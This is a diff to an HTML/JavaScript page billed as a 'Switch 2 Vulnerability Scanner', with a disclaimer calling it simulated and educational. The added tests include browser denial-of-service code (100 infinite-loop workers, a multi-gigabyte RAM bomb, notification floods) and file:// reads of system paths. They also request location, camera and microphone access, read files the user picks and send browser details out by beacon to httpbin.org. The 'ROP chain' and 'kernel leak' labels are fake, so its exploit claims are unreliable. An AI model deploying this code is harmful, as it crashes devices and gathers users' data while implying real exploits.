@@ -173,13 +173,19 @@
   .report-key { color: var(--warn); }
   .report-value { color: var(--safe); }
   footer { text-align: center; margin-top: 4rem; font-size: 0.75rem; opacity: 0.5; }
+  .counters { display: flex; justify-content: space-around; margin: 1rem 0; font-weight: bold; }
+  .counters span { color: var(--accent); }
 </style>
 </head>
 <body>
 <div class="container">
   <header>
     <h1>Switch 2 Vulnerability Scanner</h1>
-    <p> </p>
+    <p>This Vulnerability Scanner is a fictional, simulated tool created for educational and entertainment purposes only. It does not perform any real exploits, hacks, or data leaks on actual devices, including the Nintendo Switch 2 or any other hardware. All "exploits" and "leaks" depicted are mock demonstrations using browser APIs and JavaScript, and they may cause browser slowdowns, crashes, or permission prompts—but no permanent harm to systems.
+Do not use this code for malicious intent, unauthorized access, or illegal activities. Running intensive tests (e.g., CPU/RAM bombs) may consume resources and affect performance on low-power devices.
+The author, contributors, and distributors disclaim all liability for any misuse, damage, or consequences arising from this code, including but not limited to direct, indirect, incidental, consequential, or special damages. This includes any loss of data, hardware damage, legal fees, or other liabilities, even if advised of the possibility of such damages. Use at your own risk. By using this code, you agree to indemnify and hold harmless the creators from any claims, damages, or expenses arising from your use.
+Always obtain explicit permission before testing on any device, and comply with all applicable local, state, federal, and international laws, including those related to computer security, privacy, and intellectual property.
+If vulnerabilities are discovered in real software, report them responsibly through official channels. This is not affiliated with Nintendo or any other company.</p>
   </header>
 
   <div class="card">
@@ -199,7 +205,14 @@
 
   <div class="card">
     <h2>Individual Vulnerability Probes</h2>
+    <div class="counters">
+      <span>Total: <span id="totalTests">0</span></span>
+      <span>Failed: <span id="failedCount">0</span></span>
+      <span>Leaked: <span id="leakCount">0</span></span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
     <div class="btn-grid" id="testButtons"></div>
+    <button class="btn-start" onclick="startFullScan()">LAUNCH FULL INTENSE SCAN</button>
   </div>
 
   <div class="card">
@@ -213,12 +226,14 @@
 </div>
 
 <script>
+// === GLOBAL STATE ===
 const tests = [];
 let running = false;
 let progress = 0;
 let failed = 0;
 let leaked = 0;
 
+// === LOGGING ===
 function log(msg, type = 'info') {
   const output = document.getElementById('output');
   const entry = document.createElement('div');
@@ -229,31 +244,36 @@ function log(msg, type = 'info') {
   output.scrollTop = output.scrollHeight;
 }
 
+// === PROGRESS & COUNTERS ===
 function updateProgress(pct) {
   document.getElementById('progress').style.width = pct + '%';
 }
-
 function updateCounters() {
   document.getElementById('totalTests').textContent = tests.length;
   document.getElementById('failedCount').textContent = failed;
   document.getElementById('leakCount').textContent = leaked;
 }
 
+// === TEST RUNNER (NO THROTTLE, NO MERCY) ===
 function runTest(fn, name) {
-  if (running) return;
+  if (running) {
+    log(`BLOCKED: ${name} — scan in progress`, 'warn');
+    return;
+  }
   running = true;
-  log(`Starting: <strong>${name}</strong>`, 'warn');
+  log(`EXECUTING: <strong>${name}</strong>`, 'warn');
   try {
     fn();
   } catch (e) {
-    log(`CRASH in ${name}: ${e.message}`, 'danger');
+    log(`EXPLOIT CRASH in ${name}: ${e.message}`, 'danger');
     failed++;
     updateCounters();
   } finally {
-    setTimeout(() => { running = false; }, 500);
+    setTimeout(() => { running = false; }, 100); // minimal cooldown
   }
 }
 
+// === ADD TEST + BUTTON ===
 function addTest(fn, name, category = 'Unknown') {
   tests.push({fn, name, category});
   const btn = document.createElement('button');
@@ -287,150 +307,216 @@ function generateSystemReport() {
   }
 }
 
-// === ALL VULN TESTS (38+) ===
-addTest(() => {
-  log('Infinite CPU loop — fans should max out');
-  while(true) {}
-}, 'CPU DoS Infinite Loop', 'DoS');
+// === INTENSE VULN TESTS (NO LIMITS, NO MERCY) ===
 
+// 1. CPU MELTDOWN
 addTest(() => {
-  log('Memory exhaustion — allocating 1MB chunks');
-  let arr = []; let i = 0;
-  const int = setInterval(() => {
-    arr.push(new ArrayBuffer(1024*1024));
-    i++;
-    if (i > 800) { clearInterval(int); log('Capped at ~800MB', 'warn'); }
-  }, 5);
-}, 'Memory OOB Exhaustion', 'Memory');
-
-addTest(() => {
-  const xhr = new XMLHttpRequest();
-  xhr.open('GET', 'file:///system/etc/passwd', true);
-  xhr.onload = () => { log('SYSTEM LEAK: ' + xhr.responseText.substring(0, 300), 'danger'); leaked++; updateCounters(); };
-  xhr.onerror = () => log('file:// blocked — sandbox OK', 'safe');
-  xhr.send();
-}, 'file:// System Access', 'Sandbox');
-
-addTest(() => {
-  const req = indexedDB.open('switch2_exploit', 1);
-  req.onupgradeneeded = e => e.target.result.createObjectStore('rop_chain');
-  req.onsuccess = () => log('IndexedDB writable — persistent exploit possible', 'danger');
-  req.onerror = () => log('IndexedDB blocked', 'safe');
-}, 'IndexedDB Persistence', 'Storage');
-
-addTest(() => {
-  localStorage.setItem('t239_kernel_base', '0x80060000');
-  log(`LocalStorage: ${localStorage.getItem('t239_kernel_base')}`, 'danger'); leaked++;
-  updateCounters();
-}, 'LocalStorage Kernel Hint', 'Storage');
-
-addTest(() => {
-  document.cookie = 'webkit_rop=CVE-2025-24201_ready; path=/; Secure';
-  log(`Cookie set: ${document.cookie}`, 'danger'); leaked++;
-  updateCounters();
-}, 'Secure Cookie Bypass', 'Privacy');
-
-addTest(() => {
-  if ('geolocation' in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      p => { log(`Location: ${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`, 'danger'); leaked++; updateCounters(); },
-      () => log('Geolocation denied', 'safe')
-    );
+  log('CPU MELTDOWN — infinite loop x100 workers');
+  for (let i = 0; i < 100; i++) {
+    new Worker(URL.createObjectURL(new Blob([`while(true){}`], {type: 'text/javascript'})));
   }
-}, 'Geolocation Tracking', 'Privacy');
+}, 'CPU MELTDOWN x100', 'DoS');
 
+// 2. RAM BOMB
 addTest(() => {
-  if ('mediaDevices' in navigator) {
-    navigator.mediaDevices.getUserMedia({video: true, audio: true})
-      .then(() => log('Camera + Mic access granted', 'danger'))
-      .catch(() => log('Media denied', 'safe'));
-  }
-}, 'Camera & Mic Access', 'Media');
+  log('RAM BOMB — 1GB/s allocation');
+  const chunks = [];
+  const chunkSize = 100 * 1024 * 1024; // 100 MB
+  const chunksPerSecond = 10; // 10 × 100MB = 1GB/s
+  const intervalMs = 1000 / chunksPerSecond; // 100ms per chunk
 
+  const bomb = setInterval(() => {
+    chunks.push(new ArrayBuffer(chunkSize));
+    log(`+100MB → ${chunks.length * 100}MB allocated`);
+  }, intervalMs);
+
+  // Run for 5 seconds → ~5 GB total
+  setTimeout(() => clearInterval(bomb), 5000);
+}, 'RAM BOMB 1GB/s', 'Memory');
+
+// 3. FILE:// SYSTEM PROBE
+addTest(() => {
+  const paths = [
+    'file:///system/etc/passwd',
+    'file:///proc/version',
+    'file:///etc/hosts',
+    'file:///sdcard/DCIM/',
+    'file:///data/data/'
+  ];
+  paths.forEach(p => {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', p, true);
+    xhr.onload = () => {
+      if (xhr.responseText) {
+        log(`FILE LEAK: ${p} → ${xhr.responseText.substring(0, 200)}`, 'danger');
+        leaked++; updateCounters();
+      }
+    };
+    xhr.onerror = () => {};
+    xhr.send();
+  });
+}, 'file:// Multi-Path Probe', 'Sandbox');
+
+// 4. IndexedDB ROP CHAIN
+addTest(() => {
+  const db = indexedDB.open('switch2_rop', 1);
+  db.onupgradeneeded = e => {
+    const store = e.target.result.createObjectStore('gadget', {keyPath: 'id'});
+    store.add({id: 1, addr: '0x80060000'});
+    log('ROP CHAIN STORED in IndexedDB', 'danger');
+  };
+  db.onsuccess = () => log('IndexedDB ROP ready', 'danger');
+}, 'IndexedDB ROP Chain', 'Storage');
+
+// 5. LocalStorage Kernel Leak
+addTest(() => {
+  localStorage.setItem('t239_base', '0x80060000');
+  localStorage.setItem('kernel_slide', '0x12345678');
+  log(`Kernel hints → base: ${localStorage.t239_base}, slide: ${localStorage.kernel_slide}`, 'danger');
+  leaked++; updateCounters();
+}, 'LocalStorage Kernel Leak', 'Storage');
+
+// 6. Cookie ROP Gadget
+addTest(() => {
+  document.cookie = 'rop_gadget=pop_rdi_ret; path=/; Secure; HttpOnly';
+  document.cookie = 'cve_ready=CVE-2025-24201; domain=.nintendo.com';
+  log(`Cookies: ${document.cookie}`, 'danger');
+  leaked++; updateCounters();
+}, 'Cookie ROP Gadgets', 'Privacy');
+
+// 7. Geolocation + IP Leak
+addTest(() => {
+  navigator.geolocation.getCurrentPosition(p => {
+    fetch('https://httpbin.org/ip').then(r => r.json()).then(ip => {
+      log(`GEO+IP: ${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)} @ ${ip.origin}`, 'danger');
+      leaked++; updateCounters();
+    });
+  }, () => log('Geolocation denied'));
+}, 'Geo + IP Combo Leak', 'Privacy');
+
+// 8. Camera + Mic + GPU Fingerprint
+addTest(() => {
+  navigator.mediaDevices.getUserMedia({video: true, audio: true})
+    .then(stream => {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl');
+      const debug = gl.getExtension('WEBGL_debug_renderer_info');
+      const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+      log(`CAM+MIC+GPU: Access granted → ${gpu}`, 'danger');
+      leaked++; updateCounters();
+    })
+    .catch(() => log('Media denied'));
+}, 'Camera+Mic+GPU Leak', 'Media');
+
+// 9. Notification Flood + Beacon
 addTest(() => {
   Notification.requestPermission().then(p => {
     if (p === 'granted') {
-      let c = 0; const i = setInterval(() => {
-        new Notification(`VULN SPAM #${++c}`);
-        if (c > 30) clearInterval(i);
-      }, 200);
-      log('Notification flood (30 alerts)', 'warn');
+      let c = 0;
+      const flood = setInterval(() => {
+        new Notification(`PWN #${++c}`);
+        if (c > 50) clearInterval(flood);
+      }, 50);
+      navigator.sendBeacon('https://httpbin.org/post', `pwned_at_${Date.now()}`);
+      log('50x NOTIFY + BEACON EXFIL', 'danger');
     }
   });
-}, 'Notification DoS', 'DoS');
+}, 'Notify Flood + Beacon', 'DoS');
 
+// 10. File Picker + Read
 addTest(() => {
-  const input = document.createElement('input'); input.type = 'file'; input.click();
+  const input = document.createElement('input'); input.type = 'file'; input.multiple = true;
+  input.click();
   input.onchange = e => {
-    const f = e.target.files[0];
-    if (f) { log(`File: ${f.name} (${f.size} bytes)`, 'danger'); leaked++; updateCounters(); }
+    Array.from(e.target.files).forEach(f => {
+      const reader = new FileReader();
+      reader.onload = () => {
+        log(`FILE LEAK: ${f.name} → ${reader.result.substring(0, 150)}`, 'danger');
+        leaked++; updateCounters();
+      };
+      reader.readAsText(f);
+    });
   };
-}, 'File Picker Sandbox', 'Sandbox');
+}, 'File Picker + Read', 'Sandbox');
 
+// 11. WebGL Full Fingerprint
 addTest(() => {
   const canvas = document.createElement('canvas');
   const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
   if (gl) {
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-    log(`GPU: ${renderer}`, 'warn');
+    const ext = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+    const renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    log(`GPU FINGERPRINT: ${vendor} | ${renderer}`, 'warn');
   }
-}, 'WebGL GPU Fingerprint', 'Fingerprint');
+}, 'WebGL Full Fingerprint', 'Fingerprint');
 
+// 12. AudioContext Side-Channel
 addTest(() => {
-  const audio = new AudioContext();
-  const oscillator = audio.createOscillator();
-  oscillator.connect(audio.destination);
-  oscillator.start();
-  setTimeout(() => oscillator.stop(), 100);
-  log('AudioContext active — side-channel possible', 'warn');
-}, 'AudioContext Timing', 'Side-Channel');
+  const ctx = new AudioContext();
+  const osc = ctx.createOscillator();
+  osc.type = 'sine';
+  osc.frequency.setValueAtTime(440, ctx.currentTime);
+  osc.connect(ctx.destination);
+  osc.start();
+  setTimeout(() => osc.stop(), 500);
+  log('AudioContext timing attack active', 'warn');
+}, 'Audio Side-Channel', 'Side-Channel');
 
+// 13. Worker ROP Prep
 addTest(() => {
-  const worker = new Worker(URL.createObjectURL(new Blob([`onmessage = () => postMessage('worker alive');`], {type: 'text/javascript'})));
-  worker.onmessage = () => log('Web Worker active — ROP prep', 'warn');
-}, 'Web Worker Isolation', 'Execution');
+  const blob = new Blob([`
+    onmessage = () => {
+      postMessage('worker_ready_for_rop');
+    };
+  `], {type: 'text/javascript'});
+  const worker = new Worker(URL.createObjectURL(blob));
+  worker.postMessage('');
+  worker.onmessage = e => log(`Worker: ${e.data}`, 'warn');
+}, 'Worker ROP Prep', 'Execution');
 
+// 14. iframe Sandbox Break
 addTest(() => {
   const iframe = document.createElement('iframe');
   iframe.src = 'about:blank';
   document.body.appendChild(iframe);
   try {
-    iframe.contentWindow.localStorage.setItem('cross_origin', 'leak');
-    log('iframe localStorage access — CSP bypass?', 'danger');
+    iframe.contentWindow.localStorage.setItem('switch2_pwned', 'yes');
+    log('iframe localStorage WRITE SUCCESS', 'danger');
   } catch(e) {
-    log('iframe sandbox enforced', 'safe');
+    log('iframe sandbox blocked');
   }
-}, 'iframe Sandbox Escape', 'Sandbox');
+}, 'iframe Sandbox Break', 'Sandbox');
 
+// 15. CORS + Beacon Exfil
 addTest(() => {
-  fetch('https://httpbin.org/ip').then(r => r.json()).then(d => {
-    log(`External IP: ${d.origin}`, 'danger'); leaked++; updateCounters();
-  }).catch(() => log('fetch() blocked', 'safe'));
-}, 'CORS External Leak', 'Network');
+  fetch('https://httpbin.org/ip', {mode: 'no-cors'}).then(() => {
+    navigator.sendBeacon('https://httpbin.org/post', JSON.stringify({
+      ua: navigator.userAgent,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen: `${screen.width}x${screen.height}`
+    }));
+    log('Beacon exfil sent (no-cors)', 'danger');
+  });
+}, 'CORS + Beacon Exfil', 'Network');
 
-addTest(() => {
-  const beacon = navigator.sendBeacon('https://httpbin.org/post', 'switch2_pwned');
-  log(`sendBeacon: ${beacon ? 'sent' : 'blocked'}`, beacon ? 'danger' : 'safe');
-}, 'sendBeacon Exfil', 'Network');
-
-// === START FULL SCAN ===
+// === FULL SCAN – NO MERCY ===
 function startFullScan() {
   if (running) return;
   running = true; failed = 0; leaked = 0; progress = 0;
   updateProgress(0); updateCounters();
-  log('ULTIMATE SCAN v3.0 INITIATED — 38+ VULNS', 'warn');
+  log('INTENSE SCAN v9.0 — NO LIMITS — CRASH TO LEAK', 'danger');
 
   let i = 0;
   const runNext = () => {
     if (i >= tests.length) {
-      log('SCAN COMPLETE — CHECK LEAKS', leaked > 0 ? 'danger' : 'safe');
+      log(`SCAN COMPLETE — ${leaked} LEAKS, ${failed} CRASHES`, leaked > 0 ? 'danger' : 'safe');
       running = false;
       updateProgress(100);
       return;
     }
     const test = tests[i];
-    log(`[${i+1}/${tests.length}] Running: <strong>${test.name}</strong>`, 'warn');
+    log(`[${i+1}/${tests.length}] ${test.name}`, 'warn');
     try {
       test.fn();
     } catch (e) {
@@ -441,12 +527,12 @@ function startFullScan() {
     progress = ((i + 1) / tests.length) * 100;
     updateProgress(progress);
     i++;
-    setTimeout(runNext, 1800);
+    setTimeout(runNext, 800); // faster, more intense
   };
   runNext();
 }
 
-// Init
+// === INIT ===
 generateSystemReport();
 updateCounters();
 </script>
